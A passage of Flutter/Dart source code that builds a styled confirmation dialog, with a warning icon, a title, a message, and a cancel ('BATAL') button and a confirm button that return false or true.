        child: Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            color: ControlHx.surfaceHi,
            border: Border.all(
              color: confirmColor.withOpacity(0.4),
              width: 1,
            ),
            borderRadius: BorderRadius.circular(18),
            boxShadow: [
              BoxShadow(
                color: confirmColor.withOpacity(0.25),
                blurRadius: 20,
                spreadRadius: 2,
              ),
            ],
          ),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                padding: const EdgeInsets.all(14),
                decoration: BoxDecoration(
                  color: confirmColor.withOpacity(0.15),
                  shape: BoxShape.circle,
                  border: Border.all(
                    color: confirmColor.withOpacity(0.5),
                    width: 1,
                  ),
                  boxShadow: [
                    BoxShadow(
                      color: confirmColor.withOpacity(0.3),
                      blurRadius: 12,
                      spreadRadius: 1,
                    ),
                  ],
                ),
                child: Icon(
                  Icons.warning_rounded,
                  color: confirmColor,
                  size: 28,
                ),
              ),
              const SizedBox(height: 16),
              Text(
                title,
                style: TextStyle(
                  color: confirmColor,
                  fontFamily: kFontFamily,
                  fontSize: 15,
                  fontWeight: FontWeight.w900,
                  letterSpacing: 1.2,
                ),
              ),
              const SizedBox(height: 8),
              Text(
                message,
                textAlign: TextAlign.center,
                style: const TextStyle(
                  color: ControlHx.ash,
                  fontFamily: kFontFamily,
                  fontSize: 12,
                  height: 1.5,
                ),
              ),
              const SizedBox(height: 20),
              Row(
                children: [
                  Expanded(
                    child: TextButton(
                      onPressed: () => Navigator.pop(ctx, false),
                      style: TextButton.styleFrom(
                        padding: const EdgeInsets.symmetric(vertical: 12),
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(10),
                          side: BorderSide(
                            color: ControlHx.pink.withOpacity(0.3),
                            width: 1,
                          ),
                        ),
                      ),
                      child: const Text(
                        'BATAL',
                        style: TextStyle(
                          color: ControlHx.ash,
                          fontFamily: kFontFamily,
                          fontSize: 11,
                          fontWeight: FontWeight.w900,
                          letterSpacing: 1.4,
                        ),
                      ),
                    ),
                  ),
                  const SizedBox(width: 10),
                  Expanded(
                    child: TextButton(
                      onPressed: () => Navigator.pop(ctx, true),
                      style: TextButton.styleFrom(
                        padding: const EdgeInsets.symmetric(vertical: 12),
                        backgroundColor: confirmColor.withOpacity(0.15),
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(10),
                          side: BorderSide(
                            color: confirmColor.withOpacity(0.5),
                            width: 1,
                          ),
                        ),
                      ),
                      child: Text(
                        confirmLabel,
                        style: TextStyle(
                          color: confirmColor,
                          fontFamily: kFontFamily,
                          fontSize: 11,
                          fontWeight: FontWeight.w900,
                          letterSpacing: 1.4,
                        ),
                      ),
                    ),
                  ),
                ],
              ),
            ],
          ),
        ),
      ),
    );
  }
}